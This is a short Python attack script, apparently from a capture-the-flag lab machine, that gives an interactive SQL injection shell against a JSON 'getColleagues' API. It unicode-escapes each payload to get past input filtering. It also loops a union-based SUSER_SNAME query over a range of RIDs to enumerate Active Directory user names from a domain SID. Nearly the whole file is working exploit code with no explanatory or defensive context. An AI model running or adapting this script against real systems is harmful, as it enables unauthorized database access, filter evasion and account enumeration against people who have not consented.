import requests as r
import json,re

url="http://10.10.10.179/api/getColleagues"
proxy = {'http':'http://127.0.0.1:8080'}
SID = "0X0105000000000005150000001C00D1BCD181F1492BDFC236"

def encode(line):
    payload = []
    for i in line:
        char = hex(ord(i)) #each char from the payload in hex
        char = char.replace('0x', '\\u00') #replace the '0x61' for '\\u0061'
        payload.append(char) #put each char inside the list 

    payload = "".join(payload) #turns the list in a single line
    return payload

def fuzzing_RID(num):
    array=[] #create a list
    hexn = hex(int(num)) # convert the number to hex
    hexn = hexn.replace("x","") #delet the 'x'
    for char in str(hexn): 
         array.append(char) #put each char inside the list
    
    # 500 --> 0x1f4 --> 0,1,f,4 --> f410 
    ID = str(array[2]+array[3]+array[0]+array[1]) #litlle endian, so we have to reverse

    return str(ID) + "0000" 


def request_sqli(line):
    header = {'Content-Type':'application/json;charset=utf-8'}               
    payload = "a'" + line + "-- -"                                           
    payload = encode(payload)                                                
    data = '{"name":"'+payload+'"}'                                      
    response = r.post(url, data=data, headers=header, proxies=proxy)                 
    parsed = json.loads(response.text) #turns the data into json             
    response = json.dumps(parsed, indent=4, sort_keys=True) #indent the data 
   
    return response

def request_SID(line):
    header = {'Content-Type':'application/json;charset=utf-8'}
    payload = "a'" + line + "-- -"
    payload = encode(payload)
    data = '{"name":"' + payload + '"}'
    response = r.post(url, data=data, headers=header)                           
    regex = re.findall(r'(?P<jamon>\w*[A-Z]\\\\\w*)',response.text)

    return regex

if __name__ == "__main__":
    while True: 
         line = input('sqli_multi$: ')
         
         if "range:" in line:
             # range: 500, 1000
             numbers = line.split(":")[1] # separate "range:" and the numbers
             n1 = numbers.split(",")[0] # get the first number
             n2 = numbers.split(",")[1] # get the second number
             
             for num in range(int(n1), int(n2)):
                 RID = SID + fuzzing_RID(num)
                 payload = "union select 1,(SELECT SUSER_SNAME({})),3,4,5".format(RID)
                 if( len(request_SID(payload)) != 0 ):
                    print("Usuario encontrado: " + str(request_SID(payload)))
                 

         print(request_sqli(line)) 
